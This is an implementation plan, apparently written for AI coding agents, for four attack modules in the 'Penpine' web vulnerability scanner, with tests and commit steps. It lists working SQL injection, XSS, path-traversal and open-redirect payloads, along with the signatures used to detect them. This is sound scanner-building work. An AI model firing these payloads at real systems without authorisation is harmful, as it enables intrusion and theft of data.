# Penpine L4d — Concrete Attack Modules Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build L4d of Penpine — four built-in attack modules (error-based SQLi, reflected XSS, path-traversal/LFI, open-redirect) on the L4a contracts, registered under analyzer-tag names so `Runner.run(req, attack="sqli")` fires real payloads end-to-end.

**Architecture:** Each module is a point-aware `PayloadGenerator` + a signature/reflection `Validator` + an `AttackModule`, with extensible default payload/signature constants. Detection is high-confidence with a baseline false-positive guard. `register_builtins()` registers all four (no import-time side effects).

**Tech Stack:** Python 3.11+, stdlib `re`/`secrets`, `pytest`, `pytest-asyncio`. Depends on L4a (contracts/registry), L4b (`detectors`), L4c (`Runner`), L0.

---

## File Structure

```
penpine/attack/modules/
  __init__.py     # BUILTIN_MODULES, register_builtins(), exports
  _common.py      # marker(), body_text(), search_signatures()
  sqli.py  xss.py  traversal.py  redirect.py
tests/attack/modules/
  ... mirrors the above
```

Build order: scaffold → _common → sqli → xss → traversal → redirect → __init__/register + integration.

---

## Task 0: Scaffolding

**Files:**
- Create: `penpine/attack/modules/__init__.py`, `tests/attack/modules/__init__.py`

- [ ] **Step 1: Create empty package inits**

Create empty files: `penpine/attack/modules/__init__.py`, `tests/attack/modules/__init__.py`.

- [ ] **Step 2: Verify suite still green**

Run: `python -m pytest -q`
Expected: `268 passed`.

- [ ] **Step 3: Commit**

```bash
git add penpine/attack/modules tests/attack/modules
git commit -c commit.gpgsign=false -m "chore: scaffold L4d attack modules package"
```

---

## Task 1: Shared helpers (`_common.py`)

**Files:**
- Create: `penpine/attack/modules/_common.py`
- Test: `tests/attack/modules/test_common.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/attack/modules/test_common.py
import re

from penpine.core.parse.http_parser import parse_response
from penpine.attack.modules._common import marker, body_text, search_signatures


def test_marker_unique_and_prefixed():
    a, b = marker("PX"), marker("PX")
    assert a.startswith("PX_") and b.startswith("PX_") and a != b


def test_body_text():
    resp = parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: 5\r\n\r\nhello")
    assert body_text(resp) == "hello"


def test_search_signatures_returns_first_match_or_none():
    patterns = [re.compile(r"ORA-\d+"), re.compile(r"mysql", re.I)]
    assert search_signatures("error ORA-00933 here", patterns).group(0) == "ORA-00933"
    assert search_signatures("a MySQL thing", patterns).group(0).lower() == "mysql"
    assert search_signatures("nothing here", patterns) is None
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/attack/modules/test_common.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Write minimal implementation**

```python
# penpine/attack/modules/_common.py
"""Shared helpers for attack modules."""
from __future__ import annotations

import secrets


def marker(prefix: str) -> str:
    return f"{prefix}_{secrets.token_hex(4)}"


def body_text(response) -> str:
    try:
        return response.body.text()
    except Exception:
        return ""


def search_signatures(text: str, patterns):
    for pattern in patterns:
        match = pattern.search(text)
        if match:
            return match
    return None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/attack/modules/test_common.py -v`
Expected: PASS (3 passed).

- [ ] **Step 5: Commit**

```bash
git add penpine/attack/modules/_common.py tests/attack/modules/test_common.py
git commit -c commit.gpgsign=false -m "feat: add shared helpers for attack modules"
```

---

## Task 2: SQLi module

**Files:**
- Create: `penpine/attack/modules/sqli.py`
- Test: `tests/attack/modules/test_sqli.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/attack/modules/test_sqli.py
import re

from penpine.core.parse.http_parser import parse_response
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.sqli import (
    SqliGenerator, SqliValidator, SQLI_PAYLOADS, SQLI_NUMERIC_PAYLOADS, SQLI_MODULE,
)


def pt(value):
    return InjectionPoint("param:x", "param", "x", value)


def resp(body):
    return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


def test_generator_string_context():
    values = [c.payload.value for c in SqliGenerator().generate(pt("hello"), None)]
    assert values == SQLI_PAYLOADS


def test_generator_numeric_context_adds_payloads():
    values = [c.payload.value for c in SqliGenerator().generate(pt("7"), None)]
    assert values == SQLI_PAYLOADS + SQLI_NUMERIC_PAYLOADS


def test_validator_detects_sql_error():
    tc = next(iter(SqliGenerator().generate(pt("x"), None)))
    f = SqliValidator().evaluate(tc, resp(b"You have an error in your SQL syntax near '''"), None)
    assert f is not None and f.attack_type == "sqli" and f.confidence.name == "HIGH"


def test_validator_clean_response_returns_none():
    tc = next(iter(SqliGenerator().generate(pt("x"), None)))
    assert SqliValidator().evaluate(tc, resp(b"all good"), None) is None


def test_validator_baseline_guard():
    tc = next(iter(SqliGenerator().generate(pt("x"), None)))
    err = resp(b"ORA-00933: SQL command not properly ended")
    assert SqliValidator().evaluate(tc, err, err) is None   # error already in baseline


def test_custom_payloads_and_signatures():
    cases = list(SqliGenerator(payloads=["X"]).generate(pt("s"), None))
    assert [c.payload.value for c in cases] == ["X"]
    validator = SqliValidator(signatures=[re.compile("CUSTOMSIG")])
    assert validator.evaluate(cases[0], resp(b"... CUSTOMSIG ..."), None) is not None


def test_module_metadata():
    assert SQLI_MODULE.name == "sqli"
    assert SQLI_MODULE.applies("param") and not SQLI_MODULE.applies("path-seg")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/attack/modules/test_sqli.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Write minimal implementation**

```python
# penpine/attack/modules/sqli.py
"""Error-based SQL injection module."""
from __future__ import annotations

import re

from penpine.attack.analyze.detectors import is_numeric
from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import body_text, search_signatures
from penpine.attack.validator import Validator

SQLI_PAYLOADS = ["'", '"', "')", "';", "' OR '1'='1", "' OR 1=1-- -", "\\"]
SQLI_NUMERIC_PAYLOADS = [" OR 1=1", "1 OR 1=1", "1) OR (1=1"]

SQL_ERROR_SIGNATURES = [re.compile(pattern, re.I) for pattern in [
    r"you have an error in your sql syntax",
    r"warning.*\bmysqli?_",
    r"valid MySQL result",
    r"PostgreSQL.*ERROR",
    r"pg_query\(\)",
    r"unterminated quoted string",
    r"Microsoft SQL Server",
    r"ODBC SQL Server Driver",
    r"Unclosed quotation mark",
    r"ORA-\d{5}",
    r"quoted string not properly terminated",
    r"SQLite/JDBCDriver",
    r"sqlite3\.OperationalError",
    r"SQL syntax.*error",
]]


class SqliGenerator(PayloadGenerator):
    def __init__(self, payloads=None, numeric_payloads=None):
        self._payloads = list(payloads) if payloads is not None else list(SQLI_PAYLOADS)
        self._numeric = (list(numeric_payloads) if numeric_payloads is not None
                         else list(SQLI_NUMERIC_PAYLOADS))

    def generate(self, point, request):
        values = list(self._payloads)
        if is_numeric(point.value):
            values += self._numeric
        for value in values:
            yield TestCase(point=point, payload=Payload(value, technique="error-based"),
                           attack_type="sqli")


class SqliValidator(Validator):
    def __init__(self, signatures=None):
        self._signatures = (list(signatures) if signatures is not None
                            else list(SQL_ERROR_SIGNATURES))

    def evaluate(self, test_case, response, baseline=None):
        match = search_signatures(body_text(response), self._signatures)
        if match is None:
            return None
        if baseline is not None and search_signatures(body_text(baseline), self._signatures):
            return None
        return Finding("sqli", test_case.point, test_case.payload, Confidence.HIGH,
                       f"SQL error signature: {match.group(0)[:80]}",
                       request=test_case.request, response=response)


SQLI_MODULE = AttackModule("sqli", SqliGenerator(), SqliValidator(),
                           applies_to=("param", "form", "json", "multipart", "cookie"),
                           description="error-based SQL injection")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/attack/modules/test_sqli.py -v`
Expected: PASS (7 passed).

- [ ] **Step 5: Commit**

```bash
git add penpine/attack/modules/sqli.py tests/attack/modules/test_sqli.py
git commit -c commit.gpgsign=false -m "feat: add error-based SQLi attack module"
```

---

## Task 3: XSS module

**Files:**
- Create: `penpine/attack/modules/xss.py`
- Test: `tests/attack/modules/test_xss.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/attack/modules/test_xss.py
from penpine.core.parse.http_parser import parse_response
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.xss import (
    XssGenerator, XssValidator, XSS_PAYLOAD_TEMPLATES, XSS_MODULE,
)


def pt():
    return InjectionPoint("param:x", "param", "x", "v")


def resp(body):
    return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


def test_generator_unique_markers_embedded():
    cases = list(XssGenerator().generate(pt(), None))
    assert len(cases) == len(XSS_PAYLOAD_TEMPLATES)
    markers = [c.marker for c in cases]
    assert all(m and m.startswith("PXSS_") for m in markers)
    assert len(set(markers)) == len(markers)
    assert all(c.marker in c.payload.value for c in cases)
    assert all(c.attack_type == "xss" for c in cases)


def test_validator_detects_verbatim_reflection():
    tc = next(iter(XssGenerator().generate(pt(), None)))
    f = XssValidator().evaluate(tc, resp(tc.payload.value.encode()), None)
    assert f is not None and f.attack_type == "xss" and f.confidence.name == "HIGH"


def test_validator_escaped_reflection_returns_none():
    tc = next(iter(XssGenerator().generate(pt(), None)))
    escaped = tc.payload.value.replace("<", "&lt;").replace(">", "&gt;").encode()
    assert XssValidator().evaluate(tc, resp(escaped), None) is None


def test_module_metadata():
    assert XSS_MODULE.name == "xss" and XSS_MODULE.applies("param")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/attack/modules/test_xss.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Write minimal implementation**

```python
# penpine/attack/modules/xss.py
"""Reflected XSS module."""
from __future__ import annotations

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import body_text, marker
from penpine.attack.validator import Validator

XSS_PAYLOAD_TEMPLATES = [
    '"><svg/onload=alert({m})>',
    "'><script>alert({m})</script>",
    '{m}"\'><x>',
]


class XssGenerator(PayloadGenerator):
    def __init__(self, templates=None):
        self._templates = (list(templates) if templates is not None
                           else list(XSS_PAYLOAD_TEMPLATES))

    def generate(self, point, request):
        for template in self._templates:
            mk = marker("PXSS")
            value = template.format(m=mk)
            yield TestCase(point=point, payload=Payload(value, technique="reflected"),
                           attack_type="xss", marker=mk)


class XssValidator(Validator):
    def evaluate(self, test_case, response, baseline=None):
        if test_case.payload.value in body_text(response):
            return Finding("xss", test_case.point, test_case.payload, Confidence.HIGH,
                           "payload reflected unescaped in response body",
                           request=test_case.request, response=response)
        return None


XSS_MODULE = AttackModule("xss", XssGenerator(), XssValidator(),
                          applies_to=("param", "form", "json", "multipart"),
                          description="reflected XSS")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/attack/modules/test_xss.py -v`
Expected: PASS (4 passed).

- [ ] **Step 5: Commit**

```bash
git add penpine/attack/modules/xss.py tests/attack/modules/test_xss.py
git commit -c commit.gpgsign=false -m "feat: add reflected XSS attack module"
```

---

## Task 4: Path-traversal module

**Files:**
- Create: `penpine/attack/modules/traversal.py`
- Test: `tests/attack/modules/test_traversal.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/attack/modules/test_traversal.py
from penpine.core.parse.http_parser import parse_response
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.traversal import (
    TraversalGenerator, TraversalValidator, TRAVERSAL_PAYLOADS, TRAVERSAL_MODULE,
)


def pt():
    return InjectionPoint("param:file", "param", "file", "x")


def resp(body):
    return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


def test_generator_yields_payloads():
    cases = list(TraversalGenerator().generate(pt(), None))
    assert [c.payload.value for c in cases] == TRAVERSAL_PAYLOADS
    assert all(c.attack_type == "path-traversal" for c in cases)


def test_validator_detects_passwd():
    tc = next(iter(TraversalGenerator().generate(pt(), None)))
    f = TraversalValidator().evaluate(tc, resp(b"root:x:0:0:root:/root:/bin/bash"), None)
    assert f is not None and f.confidence.name == "HIGH"


def test_validator_detects_win_ini():
    tc = next(iter(TraversalGenerator().generate(pt(), None)))
    assert TraversalValidator().evaluate(tc, resp(b"[extensions]\r\nfoo=bar"), None) is not None


def test_validator_clean_and_baseline_guard():
    tc = next(iter(TraversalGenerator().generate(pt(), None)))
    assert TraversalValidator().evaluate(tc, resp(b"hello"), None) is None
    passwd = resp(b"root:x:0:0:root:/root:/bin/bash")
    assert TraversalValidator().evaluate(tc, passwd, passwd) is None


def test_module_metadata():
    assert TRAVERSAL_MODULE.name == "path-traversal"
    assert TRAVERSAL_MODULE.applies("path-seg")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/attack/modules/test_traversal.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Write minimal implementation**

```python
# penpine/attack/modules/traversal.py
"""Path traversal / LFI module."""
from __future__ import annotations

import re

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.modules._common import body_text, search_signatures
from penpine.attack.validator import Validator

TRAVERSAL_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
]

TRAVERSAL_SIGNATURES = [re.compile(pattern, re.I) for pattern in [
    r"root:.*:0:0:",
    r"daemon:.*:/usr/sbin",
    r"\[(?:extensions|fonts|mci extensions)\]",
    r"for 16-bit app support",
]]


class TraversalGenerator(PayloadGenerator):
    def __init__(self, payloads=None):
        self._payloads = list(payloads) if payloads is not None else list(TRAVERSAL_PAYLOADS)

    def generate(self, point, request):
        for value in self._payloads:
            yield TestCase(point=point, payload=Payload(value, technique="lfi"),
                           attack_type="path-traversal")


class TraversalValidator(Validator):
    def __init__(self, signatures=None):
        self._signatures = (list(signatures) if signatures is not None
                            else list(TRAVERSAL_SIGNATURES))

    def evaluate(self, test_case, response, baseline=None):
        match = search_signatures(body_text(response), self._signatures)
        if match is None:
            return None
        if baseline is not None and search_signatures(body_text(baseline), self._signatures):
            return None
        return Finding("path-traversal", test_case.point, test_case.payload, Confidence.HIGH,
                       f"file content signature: {match.group(0)[:80]}",
                       request=test_case.request, response=response)


TRAVERSAL_MODULE = AttackModule("path-traversal", TraversalGenerator(), TraversalValidator(),
                                applies_to=("param", "form", "json", "path-seg", "cookie"),
                                description="path traversal / LFI")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/attack/modules/test_traversal.py -v`
Expected: PASS (5 passed).

- [ ] **Step 5: Commit**

```bash
git add penpine/attack/modules/traversal.py tests/attack/modules/test_traversal.py
git commit -c commit.gpgsign=false -m "feat: add path-traversal/LFI attack module"
```

---

## Task 5: Open-redirect module

**Files:**
- Create: `penpine/attack/modules/redirect.py`
- Test: `tests/attack/modules/test_redirect.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/attack/modules/test_redirect.py
from penpine.core.parse.http_parser import parse_response
from penpine.attack.models import InjectionPoint
from penpine.attack.modules.redirect import (
    RedirectGenerator, RedirectValidator, REDIRECT_PAYLOADS, CANARY_HOST, REDIRECT_MODULE,
)


def pt():
    return InjectionPoint("param:next", "param", "next", "x")


def test_generator_uses_canary_host():
    cases = list(RedirectGenerator().generate(pt(), None))
    assert [c.payload.value for c in cases] == REDIRECT_PAYLOADS
    assert all(CANARY_HOST in c.payload.value for c in cases)
    assert all(c.attack_type == "open-redirect" for c in cases)


def test_validator_detects_redirect_to_canary():
    tc = next(iter(RedirectGenerator().generate(pt(), None)))
    resp = parse_response(
        b"HTTP/1.1 302 Found\r\nLocation: https://penpine-canary.example/x\r\n"
        b"Content-Length: 0\r\n\r\n")
    f = RedirectValidator().evaluate(tc, resp, None)
    assert f is not None and f.attack_type == "open-redirect" and f.confidence.name == "HIGH"


def test_validator_non_redirect_or_other_host_returns_none():
    tc = next(iter(RedirectGenerator().generate(pt(), None)))
    ok = parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
    assert RedirectValidator().evaluate(tc, ok, None) is None
    other = parse_response(
        b"HTTP/1.1 302 Found\r\nLocation: https://legit.example/\r\nContent-Length: 0\r\n\r\n")
    assert RedirectValidator().evaluate(tc, other, None) is None


def test_module_metadata():
    assert REDIRECT_MODULE.name == "open-redirect" and REDIRECT_MODULE.applies("param")
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/attack/modules/test_redirect.py -v`
Expected: FAIL — module missing.

- [ ] **Step 3: Write minimal implementation**

```python
# penpine/attack/modules/redirect.py
"""Open-redirect module."""
from __future__ import annotations

from penpine.attack.generator import PayloadGenerator
from penpine.attack.models import Confidence, Finding, Payload, TestCase
from penpine.attack.module import AttackModule
from penpine.attack.validator import Validator

CANARY_HOST = "penpine-canary.example"
REDIRECT_PAYLOADS = [f"https://{CANARY_HOST}/", f"//{CANARY_HOST}/", f"https:{CANARY_HOST}"]
_REDIRECT_STATUSES = {301, 302, 303, 307, 308}


class RedirectGenerator(PayloadGenerator):
    def __init__(self, payloads=None):
        self._payloads = list(payloads) if payloads is not None else list(REDIRECT_PAYLOADS)

    def generate(self, point, request):
        for value in self._payloads:
            yield TestCase(point=point, payload=Payload(value, technique="redirect"),
                           attack_type="open-redirect")


class RedirectValidator(Validator):
    def __init__(self, host=CANARY_HOST):
        self._host = host

    def evaluate(self, test_case, response, baseline=None):
        if response.status_code in _REDIRECT_STATUSES:
            location = response.headers.get("Location", "")
            if self._host in location:
                return Finding("open-redirect", test_case.point, test_case.payload,
                               Confidence.HIGH, f"redirect Location to canary: {location}",
                               request=test_case.request, response=response)
        return None


REDIRECT_MODULE = AttackModule("open-redirect", RedirectGenerator(), RedirectValidator(),
                               applies_to=("param", "form", "json"),
                               description="open redirect")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python -m pytest tests/attack/modules/test_redirect.py -v`
Expected: PASS (4 passed).

- [ ] **Step 5: Commit**

```bash
git add penpine/attack/modules/redirect.py tests/attack/modules/test_redirect.py
git commit -c commit.gpgsign=false -m "feat: add open-redirect attack module"
```

---

## Task 6: register_builtins + public API + end-to-end

**Files:**
- Modify: `penpine/attack/modules/__init__.py`, `penpine/attack/__init__.py`
- Test: `tests/attack/modules/test_registration.py`, `tests/attack/modules/test_integration.py`

- [ ] **Step 1: Write the failing test**

```python
# tests/attack/modules/test_registration.py
import pytest

from penpine.attack import registry
from penpine.attack.modules import register_builtins, BUILTIN_MODULES


@pytest.fixture(autouse=True)
def _clean_registry():
    registry.clear()
    yield
    registry.clear()


def test_register_builtins_registers_all_and_is_idempotent():
    register_builtins()
    for name in ("sqli", "xss", "path-traversal", "open-redirect"):
        assert registry.get(name)
    register_builtins()    # replace=True -> no raise on re-register
    assert set(registry.list_modules()) >= {"sqli", "xss", "path-traversal", "open-redirect"}
    assert len(BUILTIN_MODULES) == 4


def test_import_has_no_side_effects():
    import penpine.attack.modules  # noqa: F401  (already imported; must not have registered)
    assert registry.list_modules() == []


def test_attack_package_reexports():
    from penpine.attack import register_builtins as rb, BUILTIN_MODULES as bm
    assert rb is register_builtins
    assert bm is BUILTIN_MODULES
```

```python
# tests/attack/modules/test_integration.py
import pytest

from penpine.core.message import Request
from penpine.core.parse.http_parser import parse_response
from penpine.attack import registry
from penpine.attack.modules import register_builtins
from penpine.attack.runner import Runner


@pytest.fixture(autouse=True)
def _clean_registry():
    registry.clear()
    yield
    registry.clear()


class SqlErrorSender:
    """Returns a SQL-error body when the request looks injected (has an encoded quote
    or an injected OR), else a clean page."""

    async def send(self, request):
        raw = request.serialize()
        if b"%27" in raw or b"%22" in raw or b"OR" in raw:
            body = b"You have an error in your SQL syntax near '%' at line 1"
        else:
            body = b"home page"
        return parse_response(
            b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s" % (len(body), body))


async def test_end_to_end_sqli_finding_via_runner():
    register_builtins()
    report = await Runner(sender=SqlErrorSender()).run(
        Request.from_url("http://h/?q=hi"), attack="sqli")
    assert report.attack_type == "sqli"
    assert report.findings, "expected at least one SQLi finding"
    finding = report.findings[0]
    assert finding.attack_type == "sqli"
    assert finding.confidence.name == "HIGH"
    assert finding.request is not None        # runner set the sent request
    assert "param:q" == finding.point.expr
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python -m pytest tests/attack/modules/test_registration.py tests/attack/modules/test_integration.py -v`
Expected: FAIL — `register_builtins`/exports missing.

- [ ] **Step 3: Write minimal implementation**

```python
# penpine/attack/modules/__init__.py
"""Penpine L4d built-in attack modules. No import-time registration."""
from penpine.attack.modules.sqli import (
    SqliGenerator, SqliValidator, SQLI_PAYLOADS, SQLI_NUMERIC_PAYLOADS,
    SQL_ERROR_SIGNATURES, SQLI_MODULE,
)
from penpine.attack.modules.xss import (
    XssGenerator, XssValidator, XSS_PAYLOAD_TEMPLATES, XSS_MODULE,
)
from penpine.attack.modules.traversal import (
    TraversalGenerator, TraversalValidator, TRAVERSAL_PAYLOADS,
    TRAVERSAL_SIGNATURES, TRAVERSAL_MODULE,
)
from penpine.attack.modules.redirect import (
    RedirectGenerator, RedirectValidator, REDIRECT_PAYLOADS, CANARY_HOST, REDIRECT_MODULE,
)
from penpine.attack.registry import register

BUILTIN_MODULES = [SQLI_MODULE, XSS_MODULE, TRAVERSAL_MODULE, REDIRECT_MODULE]


def register_builtins(*, replace=True) -> None:
    """Register all built-in attack modules into the global registry (idempotent)."""
    for module in BUILTIN_MODULES:
        register(module, replace=replace)


__all__ = [
    "SqliGenerator", "SqliValidator", "SQLI_PAYLOADS", "SQLI_NUMERIC_PAYLOADS",
    "SQL_ERROR_SIGNATURES", "SQLI_MODULE",
    "XssGenerator", "XssValidator", "XSS_PAYLOAD_TEMPLATES", "XSS_MODULE",
    "TraversalGenerator", "TraversalValidator", "TRAVERSAL_PAYLOADS",
    "TRAVERSAL_SIGNATURES", "TRAVERSAL_MODULE",
    "RedirectGenerator", "RedirectValidator", "REDIRECT_PAYLOADS", "CANARY_HOST",
    "REDIRECT_MODULE",
    "BUILTIN_MODULES", "register_builtins",
]
```

Then in `penpine/attack/__init__.py`, add after the existing runner/results re-export lines:

```python
from penpine.attack.modules import register_builtins, BUILTIN_MODULES
```

Add `"register_builtins", "BUILTIN_MODULES"` to the `__all__` list in `penpine/attack/__init__.py`.

- [ ] **Step 4: Run the FULL suite**

Run: `python -m pytest -q`
Expected: PASS — all prior + L4d tests green (no failures, no errors).

- [ ] **Step 5: Commit**

```bash
git add penpine/attack/modules/__init__.py penpine/attack/__init__.py tests/attack/modules/test_registration.py tests/attack/modules/test_integration.py
git commit -c commit.gpgsign=false -m "feat: add register_builtins + expose L4d modules + end-to-end"
```

---

## Self-Review Notes (against the spec)

- **§3 module layout** → Tasks 0–6 create every listed file.
- **§4 shared helpers** → Task 1.
- **§5.1 sqli** (string + numeric-context payloads, error signatures, baseline guard, extensibility) → Task 2.
- **§5.2 xss** (templated unique markers, verbatim-reflection detection) → Task 3.
- **§5.3 traversal** (payloads, file-content signatures, baseline guard) → Task 4.
- **§5.4 redirect** (canary payloads, 3xx + Location detection) → Task 5.
- **§6 registration & public API** (register_builtins idempotent, no import side effects, re-exports) → Task 6.
- **§7 testing** (per-module generator/validator/baseline-guard/extensibility, registration, end-to-end SQLi via runner) → every task is test-first; end-to-end in Task 6.

**Deferred (per spec §2):** differential SQLi (boolean/time), blind/OOB SSRF, command-injection.

**Notes for implementers:** module names MUST match analyzer tags exactly (`sqli`, `xss`, `path-traversal`, `open-redirect`) so the runner's `for_attack(attack_type)` selects the right points. `register_builtins` uses `replace=True` so it's safe to call repeatedly. The end-to-end sender keys off `%27`/`OR` because `replace_at`/`set_param` URL-encodes the injected quote (`'` → `%27`).
```
